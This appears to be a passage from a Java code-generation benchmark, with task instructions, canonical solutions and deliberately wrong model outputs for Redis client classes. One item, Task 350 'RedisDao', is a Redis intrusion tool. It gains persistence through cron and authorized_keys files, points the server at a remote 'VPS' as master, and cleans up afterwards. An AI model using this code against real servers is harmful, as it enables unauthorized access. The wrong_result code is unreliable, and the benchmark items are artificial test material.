    "wrong_result": "public class JedisSharding {\n    private List<HostAndPort> shards;\n    private JedisClientConfig clientConfig;\n    private Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = new MurmurHash();\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    private int getShardIndex(String key) {\n        int hash = hashing.hash(key);\n        int shardCount = shards.size();\n        return Math.abs(hash % shardCount);\n    }\n\n    private Jedis getShard(String key) {\n        int index = getShardIndex(key);\n        HostAndPort hostAndPort = shards.get(index);\n        return new Jedis(hostAndPort.getHost(), hostAndPort.getPort(), clientConfig);\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = getShard(key);\n        return jedis.set(key, value);\n    }\n\n    public String get(String key) {\n        Jedis jedis = getShard(key);\n        return jedis.get(key);\n    }\n\n    public Object sendCommand(String key, Protocol.Command cmd, String... args) {\n        Jedis jedis = getShard(key);\n        return jedis.sendCommand(cmd, args);\n    }\n\n    public void close() {\n        // No-op\n    }\n\n    public interface Hashing {\n        int hash(String key);\n    }\n\n    public static class MurmurHash implements Hashing {\n        @Override\n        public int hash(String key) {\n            return key.hashCode();\n        }\n    }\n}"
  },
  {
    "Task_id": 347,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, operations, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections and provides basic Redis operations. It handles connection lifecycle and ensures proper resource cleanup.\n\nAttributes:\n- client: RedisClient - The Redis client instance used for connections\n- redis: RedisCommands<String, String> - Synchronous Redis commands interface for string operations\n\nMethods:\n- setupClient(): void - Static method to initialize the default Redis client with default options\n- newRedisClient(): RedisClient - Static method to create a new Redis client with test resources (host and port should be defined elsewhere)\n- connect(): RedisCommands<String, String> - Establishes and returns a synchronous Redis connection\n- openConnection(): void - Opens a connection, configures client options, and ensures Redis is in a clean state by flushing data and killing any running scripts\n- closeConnection(): void - Closes the active Redis connection and releases resources",
    "Canonical_solution": "import io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.resource.DefaultRedisClient;\nimport io.lettuce.test.resource.TestClientResources;\n\npublic class RedisConnectionManager {\n\n    protected static RedisClient client;\n    protected RedisCommands<String, String> redis;\n\n    public static void setupClient() {\n        client = DefaultRedisClient.get();\n        client.setOptions(ClientOptions.create());\n    }\n\n    private static RedisClient newRedisClient() {\n        return RedisClient.create(TestClientResources.get(), RedisURI.Builder.redis(host, port).build());\n    }\n\n    public RedisCommands<String, String> connect() {\n        RedisCommands<String, String> connect = client.connect().sync();\n        return connect;\n    }\n\n    public void openConnection() throws Exception {\n        client.setOptions(ClientOptions.builder().build());\n        redis = connect();\n        boolean scriptRunning;\n        do {\n            scriptRunning = false;\n            try {\n                redis.flushall();\n                redis.flushdb();\n            } catch (RedisBusyException e) {\n                scriptRunning = true;\n                try {\n                    redis.scriptKill();\n                } catch (RedisException e1) {\n                    // Script might have ended between BUSY check and KILL attempt\n                }\n            }\n        } while (scriptRunning);\n    }\n\n    public void closeConnection() throws Exception {\n        if (redis != null) {\n            redis.getStatefulConnection().close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private static final String HOST = \"localhost\";\n    private static final int PORT = 6379;\n    private static final String TEST_HOST = \"testhost\";\n    private static final int TEST_PORT = 6380;\n\n    private static RedisClient client;\n    private static RedisCommands<String, String> redis;\n\n    public static void setupClient() {\n        client = RedisClient.create(\"redis://@\" + HOST + \":\" + PORT);\n    }\n\n    public static RedisClient newRedisClient() {\n        return RedisClient.create(\"redis://@\" + TEST_HOST + \":\" + TEST_PORT);\n    }\n\n    public static RedisCommands<String, String> connect() {\n        return client.connect().sync();\n    }\n\n    public static void openConnection() {\n        redis = connect();\n        redis.flushAll();\n        redis.scriptKill();\n    }\n\n    public static void closeConnection() {\n        if (redis != null) {\n            redis.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Java class that implements Redis cluster operations using JedisCluster for caching management, including basic CRUD operations, hash operations, and batch operations.\n\nClass Description: JedisClusterCacheManager is a Redis cache manager implementation that uses JedisCluster to interact with a Redis cluster. It provides various Redis operations including setting/getting values, hash operations, batch operations, and deletion. The class handles serialization/deserialization of objects and manages Redis connections.\n\nAttributes:\n- redis: JedisClusterClient - The Redis client wrapper that implements IRedis interface\n- log: Logger - Logger instance for error logging\n- serializer: ISerializer<Object> - Serializer for converting objects to/from byte arrays (inherited from AbstractRedisCacheManager)\n\nMethods:\n- JedisClusterCacheManager(JedisCluster, ISerializer<Object>) -> void - Constructor that initializes the Redis client and serializer\n- getRedis() -> IRedis - Returns the Redis client instance\n- close() -> void - Closes the Redis connection (inherited from AbstractRedisCacheManager)\n- set(byte[], byte[]) -> void - Sets a key-value pair in Redis\n- setex(byte[], int, byte[]) -> void - Sets a key-value pair with expiration time\n- hset(byte[], byte[], byte[]) -> void - Sets a field in a Redis hash\n- hset(byte[], byte[], byte[], int) -> void - Sets a field in a Redis hash with expiration time for the key\n- mset(Collection<MSetParam>) -> void - Batch sets multiple key-value pairs\n- get(byte[]) -> byte[] - Gets a value by key\n- hget(byte[], byte[]) -> byte[] - Gets a field value from a Redis hash\n- mget(Type, Set<CacheKeyTO>) -> Map<CacheKeyTO, CacheWrapper<Object>> - Batch gets multiple values\n- delete(Set<CacheKeyTO>) -> void - Deletes multiple keys",
    "Canonical_solution": "import com.jarvis.cache.MSetParam;\nimport com.jarvis.cache.serializer.ISerializer;\nimport com.jarvis.cache.to.CacheKeyTO;\nimport com.jarvis.cache.to.CacheWrapper;\nimport redis.clients.jedis.JedisCluster;\nimport java.io.IOException;\nimport java.lang.reflect.Type;\nimport java.util.Collection;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class JedisClusterCacheManager extends AbstractRedisCacheManager {\n\n    private static final Logger log = LoggerFactory.getLogger(JedisClusterCacheManager.class);\n    \n    private final JedisClusterClient redis;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        super(serializer);\n        this.redis = new JedisClusterClient(jedisCluster, this);\n    }\n\n    @Override\n    protected IRedis getRedis() {\n        return redis;\n    }\n\n    public static class JedisClusterClient implements IRedis {\n\n        private final JedisCluster jedisCluster;\n        private final AbstractRedisCacheManager cacheManager;\n\n        public JedisClusterClient(JedisCluster jedisCluster, AbstractRedisCacheManager cacheManager) {\n            this.jedisCluster = jedisCluster;\n            this.cacheManager = cacheManager;\n        }\n\n        @Override\n        public void close() throws IOException {\n        }\n\n        @Override\n        public void set(byte[] key, byte[] value) {\n            jedisCluster.set(key, value);\n        }\n\n        @Override\n        public void setex(byte[] key, int seconds, byte[] value) {\n            jedisCluster.setex(key, seconds, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value) {\n            jedisCluster.hset(key, field, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    pipeline.hset(key, field, value);\n                    pipeline.expire(key, seconds);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public void mset(Collection<MSetParam> params) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) throws Exception {\n                    JedisUtil.executeMSet(pipeline, cacheManager, params);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public byte[] get(byte[] key) {\n            return jedisCluster.get(key);\n        }\n\n        @Override\n        public byte[] hget(byte[] key, byte[] field) {\n            return jedisCluster.hget(key, field);\n        }\n\n        @Override\n        public Map<CacheKeyTO, CacheWrapper<Object>> mget(Type returnType, Set<CacheKeyTO> keys) throws Exception {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeMGet(pipeline, keys);\n                }\n            };\n            return cacheManager.deserialize(keys, retryableJedisClusterPipeline.syncAndReturnAll(), returnType);\n        }\n\n        @Override\n        public void delete(Set<CacheKeyTO> keys) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeDelete(pipeline, keys);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class JedisClusterCacheManager extends AbstractRedisCacheManager {\n    private final JedisClusterClient redis;\n    private final ISerializer<Object> serializer;\n    private final Logger log;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        this.redis = new JedisClusterClient(jedisCluster);\n        this.serializer = serializer;\n        this.log = LoggerFactory.getLogger(JedisClusterCacheManager.class);\n    }\n\n    @Override\n    public IRedis getRedis() {\n        return redis;\n    }\n\n    public void set(byte[] key, byte[] value) {\n        try {\n            redis.set(key, value);\n        } catch (Exception e) {\n            log.error(\"Error setting key: {}\", Arrays.toString(key), e);\n            throw new RuntimeException(\"Redis set failed\", e);\n        }\n    }\n\n    public void setex(byte[] key, int seconds, byte[] value) {\n        try {\n            redis.setex(key, seconds, value);\n        } catch (Exception e) {\n            log.error(\"Error setting key with expiration: {}\", Arrays.toString(key), e);\n            throw new RuntimeException(\"Redis setex failed\", e);\n        }\n    }\n\n    public void hset(byte[] key, byte[] field, byte[] value) {\n        try {\n            redis.hset(key, field, value);\n        } catch (Exception e) {\n            log.error(\"Error setting hash field: {}\", Arrays.toString(key), e);\n            throw new RuntimeException(\"Redis hset failed\", e);\n        }\n    }\n\n    public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n        try {\n            redis.hsetex(key, field, value, seconds);\n        } catch (Exception e) {\n            log.error(\"Error setting hash field with expiration: {}\", Arrays.toString(key), e);\n            throw new RuntimeException(\"Redis hsetex failed\", e);\n        }\n    }\n\n    public void mset(Collection<MSetParam> params) {\n        List<byte[]> keys = new ArrayList<>();\n        List<byte[]> values = new ArrayList<>();\n        for (MSetParam param : params) {\n            keys.add(param.getKey());\n            values.add(param.getValue());\n        }\n        try {\n            redis.mset(keys, values);\n        } catch (Exception e) {\n            log.error(\"Error in batch set operation\", e);\n            throw new RuntimeException(\"Redis mset failed\", e);\n        }\n    }\n\n    public byte[] get(byte[] key) {\n        try {\n            return redis.get(key);\n        } catch (Exception e) {\n            log.error(\"Error getting key: {}\", Arrays.toString(key), e);\n            return null;\n        }\n    }\n\n    public byte[] hget(byte[] key, byte[] field) {\n        try {\n            return redis.hget(key, field);\n        } catch (Exception e) {\n            log.error(\"Error getting hash field: {}\", Arrays.toString(key), e);\n            return null;\n        }\n    }\n\n    public Map<CacheKeyTO, CacheWrapper<Object>> mget(Set<CacheKeyTO> keys) {\n        List<byte[]> keyList = keys.stream()\n                .map(CacheKeyTO::getKey)\n                .collect(Collectors.toList());\n        List<byte[]> results = redis.mget(keyList);\n        Map<CacheKeyTO, CacheWrapper<Object>> resultMap = new HashMap<>();\n        for (int i = 0; i < keys.size(); i++) {\n            CacheKeyTO keyTO = keys.get(i);\n            byte[] result = results.get(i);\n            Object deserialized = serializer.deserialize(result);\n            resultMap.put(keyTO, new CacheWrapper<>(deserialized));\n        }\n        return resultMap;\n    }\n\n    public void delete(Set<CacheKeyTO> keys) {\n        List<byte[]> keyList = keys.stream()\n                .map(CacheKeyTO::getKey)\n                .collect(Collectors.toList());\n        try {\n            redis.del(keyList);\n        } catch (Exception e) {\n            log.error(\"Error deleting keys\", e);\n            throw new RuntimeException(\"Redis delete failed\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Java class that provides Redis database operations including connection management, configuration changes, data persistence, and cleanup operations.\n\nClass Description: The RedisDao class encapsulates Redis operations using the Jedis client. It handles connection establishment, authentication, configuration management, data persistence, and cleanup tasks. The class supports various Redis operations including slave configuration, cron job setup, SSH key injection, and system cleanup.\n\nAttributes:\n- CONN: Jedis - Static instance of Redis connection\n- dir: List<String> - Static list storing Redis directory configuration\n- slaveReadOnlyFlag: String - Static flag for slave read-only configuration (default \"yes\")\n- ip: String - Redis server IP address\n- port: int - Redis server port number\n- password: String - Redis authentication password\n- timeout: int - Connection timeout in milliseconds\n\nMethods:\n- testConnection(): void - Tests Redis connection by creating a temporary connection, authenticating if needed, retrieving server info, and closing the connection\n- getConnection(): void - Establishes a persistent Redis connection and authenticates if required\n- closeConnection(): void - Closes the active Redis connection\n- getInfo(): void - Retrieves Redis server information and configuration directory\n- redisavedb(String dir, String dbfilename): void - Configures Redis persistence directory and filename, then triggers a save operation\n- redisslave(String vpsIp, String vpsPort): void - Configures Redis as a slave of another instance\n- crontab(String cronText): void - Attempts to create cron jobs by writing to various cron directories\n- sshkey(String sshRsa, String Path): void - Writes SSH public key to specified directory as authorized_keys\n- clean(): void - Restores original Redis configuration and cleans up temporary data",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport java.util.List;\n\npublic class RedisDao {\n    public static Jedis CONN;\n    public static List<String> dir;\n    public static String slaveReadOnlyFlag = \"yes\";\n\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public RedisDao(String ip, String port, String password, String timeout) {\n        this.ip = ip;\n        this.port = Integer.parseInt(port);\n        this.password = password;\n        this.timeout = Integer.parseInt(timeout) * 1000;\n    }\n\n    public void testConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n        CONN.info();\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getConnection() throws Exception {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() throws Exception {\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getInfo() throws Exception {\n        String info = CONN.info();\n        dir = CONN.configGet(\"dir\");\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        CONN.configSet(\"dir\", dir);\n        CONN.configSet(\"dbfilename\", dbfilename);\n        CONN.save();\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));\n    }\n\n    public void crontab(String cronText) {\n        List<String> crondirs = Arrays.asList(\"/var/spool/cron/\", \"/var/spool/cron/crontab/\", \"/var/spool/cron/crontabs/\");\n        for (String dir : crondirs) {\n            try {\n                String randomString = Utils.getRandomString();\n                CONN.set(\"xxcron\", \"\\n\\n\" + cronText + \"\\n\\n\");\n                CONN.configSet(\"dir\", dir);\n                CONN.configSet(\"dbfilename\", randomString);\n                CONN.save();\n                break;\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void sshkey(String sshRsa, String Path) {\n        CONN.set(\"xxssh\", \"\\n\\n\" + sshRsa + \"\\n\\n\");\n        CONN.configSet(\"dir\", Path);\n        CONN.configSet(\"dbfilename\", \"authorized_keys\");\n        CONN.save();\n    }\n\n    public void clean() {\n        CONN.configSet(\"dir\", dir.get(1));\n        CONN.configSet(\"slave-read-only\", slaveReadOnlyFlag);\n        CONN.configSet(\"dbfilename\", \"dump.rdb\");\n        CONN.slaveofNoOne();\n        CONN.moduleUnload(\"system\");\n        CONN.del(\"xxssh\");\n        CONN.del(\"xxcron\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisDao {\n    private static Jedis CONN;\n    private static List<String> dir = new ArrayList<>();\n    private static String slaveReadOnlyFlag = \"yes\";\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public RedisDao(String ip, int port, String password, int timeout) {\n        this.ip = ip;\n        this.port = port;\n        this.password = password;\n        this.timeout = timeout;\n    }\n\n    public void testConnection() {\n        Jedis tempConn = new Jedis(ip, port, timeout);\n        if (password != null && !password.isEmpty()) {\n            tempConn.auth(password);\n        }\n        String info = tempConn.info();\n        System.out.println(\"Redis Server Info: \" + info);\n        tempConn.close();\n    }\n\n    public void getConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (password != null && !password.isEmpty()) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() {\n        if (CONN != null) {\n            CONN.close();\n            CONN = null;\n        }\n    }\n\n    public void getInfo() {\n        if (CONN == null) {\n            throw new IllegalStateException(\"Connection is not established.\");\n        }\n        String info = CONN.info();\n        System.out.println(\"Redis Server Info: \" + info);\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        if (CONN == null) {\n            throw new IllegalStateException(\"Connection is not established.\");\n        }\n        CONN.configSet(\"dir\", dir);\n        CONN.configSet(\"dbfilename\", dbfilename);\n        CONN.save();\n        RedisDao.dir.add(dir);\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        if (CONN == null) {\n            throw new IllegalStateException(\"Connection is not established.\");\n        }\n        CONN.slaveOf(vpsIp, vpsPort);\n    }\n\n    public void crontab(String cronText) {\n        String[] cronDirs = {\"/etc/crontab\", \"/var/spool/cron\", \"/tmp/cron\"};\n        for (String dir : cronDirs) {\n            try (FileWriter writer = new FileWriter(dir, true)) {\n                writer.write(cronText + \"\\n\");\n            } catch (IOException e) {\n                System.err.println(\"Error writing cron job to \" + dir + \": \" + e.getMessage());\n            }\n        }\n    }\n\n    public void sshkey(String sshRsa, String path) {\n        String authorizedKeysPath = path + \"/authorized_keys\";\n        try (FileWriter writer = new FileWriter(authorizedKeysPath, true)) {\n            writer.write(sshRsa + \"\\n\");\n        } catch (IOException e) {\n            System.err.println(\"Error writing SSH key to \" + authorizedKeysPath + \": \" + e.getMessage());\n        }\n    }\n\n    public void clean() {\n        if (CONN != null) {\n            closeConnection();\n        }\n        dir.clear();\n        slaveReadOnlyFlag = \"yes\";\n    }\n}"
  },
  {
    "Task_id": 351,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, allowing read operations to prefer the master node while maintaining failover capabilities.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave cluster, manage the connection, and properly clean up resources when done. It uses Lettuce's MasterReplica API for high availability support.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance used for connection management\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to the Redis master-slave cluster\n\nMethods:\n- RedisMasterSlaveConnector() -> void - Constructor that initializes the RedisClient instance\n- connect(List<RedisURI> nodes) -> void - Establishes a connection to the Redis master-slave cluster using the provided node URIs and configures read preference\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- close() -> void - Properly closes the connection and shuts down the Redis client to release resources",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        this.connection = MasterReplica.connect(redisClient, StringCodec.UTF8, nodes);\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisMasterSlaveConnector {\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        if (nodes == null || nodes.isEmpty()) {\n            throw new IllegalArgumentException(\"Nodes list cannot be null or empty\");\n        }\n        RedisURI masterUri = nodes.get(0);\n        redisClient = RedisClient.create(masterUri);\n        connection = redisClient.connectMasterReplica();\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Implement a distributed lock mechanism using Redis in Java to ensure thread-safe operations across multiple processes or systems.\n\nClass Description: RedisDistributeLock is a class that provides distributed locking functionality using Redis as the backend storage. It manages lock acquisition, release, and timeout handling to coordinate access to shared resources in a distributed environment.\n\nAttributes:\n- pool: [JedisPool] - The connection pool for Redis connections\n- jedisLock: [JedisLock] - The lock implementation instance\n- lockKey: [String] - The key used for locking in Redis\n- jedis: [Jedis] - The Redis client instance\n- timeoutMsecs: [int] - Maximum time to wait for lock acquisition in milliseconds\n- expireMsecs: [int] - Time after which the lock automatically expires in milliseconds\n\nMethods:\n- RedisDistributeLock([String] lockKey) -> [void] - Constructor with default timeout (3000ms) and expire (300000ms) values\n- RedisDistributeLock([String] lockKey, [int] timeoutMsecs, [int] expireMsecs) -> [void] - Constructor with custom timeout and expire values\n- wrap([Runnable] runnable) -> [void] - Executes the given runnable within the acquired lock context\n- lockRelease([JedisLock] lock, [Jedis] jedis) -> [void] - Releases the lock and closes the Redis connection\n- getPool() -> [JedisPool] - Static getter for the Redis connection pool\n- setPool([JedisPool] pool) -> [void] - Static setter for the Redis connection pool",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\npublic class RedisDistributeLock {\n\n    private static Logger LOGGER = LoggerFactory.getLogger(RedisDistributeLock.class);\n\n    private static JedisPool pool;\n    private JedisLock jedisLock;\n    private String lockKey;\n    private Jedis jedis;\n    private int timeoutMsecs;\n    private int expireMsecs;\n\n    public RedisDistributeLock(String lockKey) {\n        this(lockKey, 3000, 300000);\n    }\n\n    public RedisDistributeLock(String lockKey, int timeoutMsecs, int expireMsecs) {\n        this.lockKey = lockKey;\n        this.jedis = pool.getResource();\n        this.timeoutMsecs = timeoutMsecs;\n        this.expireMsecs = expireMsecs;\n        this.jedisLock = new JedisLock(jedis, lockKey.intern(), timeoutMsecs, expireMsecs);\n    }\n\n    public void wrap(Runnable runnable) {\n        long begin = System.currentTimeMillis();\n        try {\n            LOGGER.info(\"begin logck,lockKey={},timeoutMsecs={},expireMsecs={}\", lockKey, timeoutMsecs, expireMsecs);\n            if (jedisLock.acquire()) {\n                runnable.run();\n            } else {\n                LOGGER.info(\"The time wait for lock more than [{}] ms \", timeoutMsecs);\n            }\n        } catch (Throwable t) {\n            LOGGER.warn(t.getMessage(), t);\n        } finally {\n            this.lockRelease(jedisLock, jedis);\n        }\n        LOGGER.info(\"[{}]cost={}\", lockKey, System.currentTimeMillis() - begin);\n    }\n\n    private void lockRelease(JedisLock lock, Jedis jedis) {\n        if (lock != null) {\n            try {\n                lock.release();\n            } catch (Exception e) {\n            }\n        }\n        if (jedis != null) {\n            jedis.close();\n        }\n        LOGGER.info(\"release logck,lockKey={},timeoutMsecs={},expireMsecs={}\", lockKey, timeoutMsecs, expireMsecs);\n    }\n\n    public static JedisPool getPool() {\n        return pool;\n    }\n\n    public static synchronized void setPool(JedisPool pool) {\n        RedisDistributeLock.pool = pool;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisDistributeLock {\n    private JedisPool pool;\n    private String lockKey;\n    private int timeoutMsecs;\n    private int expireMsecs;\n    private JedisLock jedisLock;\n    private Jedis jedis;\n\n    public RedisDistributeLock(String lockKey) {\n        this.lockKey = lockKey;\n        this.timeoutMsecs = 3000;\n        this.expireMsecs = 300000;\n    }\n\n    public RedisDistributeLock(String lockKey, int timeoutMsecs, int expireMsecs) {\n        this.lockKey = lockKey;\n        this.timeoutMsecs = timeoutMsecs;\n        this.expireMsecs = expireMsecs;\n    }\n\n    public void wrap(Runnable runnable) {\n        jedis = pool.getResource();\n        String uniqueValue = UUID.randomUUID().toString();\n        long startTime = System.currentTimeMillis();\n        String result = null;\n        while (System.currentTimeMillis() - startTime < timeoutMsecs) {\n            result = jedis.set(lockKey, uniqueValue, \"NX\", \"PX\", expireMsecs);\n            if (result != null) {\n                break;\n            }\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n        if (result == null) {\n            throw new RuntimeException(\"Failed to acquire lock within timeout\");\n        }\n        try {\n            runnable.run();\n        } finally {\n            if (jedis.exists(lockKey)) {\n                jedis.del(lockKey);\n            }\n        }\n    }\n\n    public void lockRelease(JedisLock lock, Jedis jedis) {\n        if (jedis.exists(lock.getKey()) && jedis.get(lock.getKey()).equals(lock.getValue())) {\n            jedis.del(lock.getKey());\n        }\n    }\n\n    public static JedisPool getPool() {\n        return pool;\n    }\n\n    public static void setPool(JedisPool pool) {\n        RedisDistributeLock.pool = pool;\n    }\n}"
  },
  {
    "Task_id": 354,
    "Instruction": "Task Description: Create a Java class that manages Redis connections and operations using the Jedis client library, providing connection pooling and basic CRUD functionality.\n\nClass Description: RedisConnectionManager is a utility class that handles Redis connection management, authentication, and basic operations. It uses JedisPooled for connection pooling and provides thread-safe access to Redis resources.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection manager\n- poolConfig: GenericObjectPoolConfig<Connection> - Configuration for the connection pool\n\nMethods:\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) -> void - Constructor that initializes the connection with host/port and client configuration\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, GenericObjectPoolConfig<Connection> poolConfig) -> void - Constructor with additional pool configuration\n- getConnection() -> Connection - Gets a connection from the pool\n- closeConnection(Connection connection) -> void - Returns a connection to the pool\n- setCredentialsProvider(RedisCredentialsProvider credentialsProvider) -> void - Updates the authentication credentials\n- executeCommand(String key, String value) -> void - Executes a SET command\n- getValue(String key) -> String - Executes a GET command and returns the value\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.RedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentials;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedisPool;\n    private GenericObjectPoolConfig<Connection> poolConfig;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig);\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, \n                                GenericObjectPoolConfig<Connection> poolConfig) {\n        this.poolConfig = poolConfig;\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig, poolConfig);\n    }\n\n    public Connection getConnection() throws JedisException {\n        return jedisPool.getPool().getResource();\n    }\n\n    public void closeConnection(Connection connection) {\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n            .credentialsProvider(credentialsProvider)\n            .build();\n        this.jedisPool = new JedisPooled(jedisPool.getPool().getAddress(), clientConfig);\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.SET, key, value);\n            String response = connection.getStatusCodeReply();\n            if (!\"OK\".equals(response)) {\n                throw new JedisException(\"Failed to set key: \" + key);\n            }\n        }\n    }\n\n    public String getValue(String key) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.GET, key);\n            return connection.getBulkReply();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
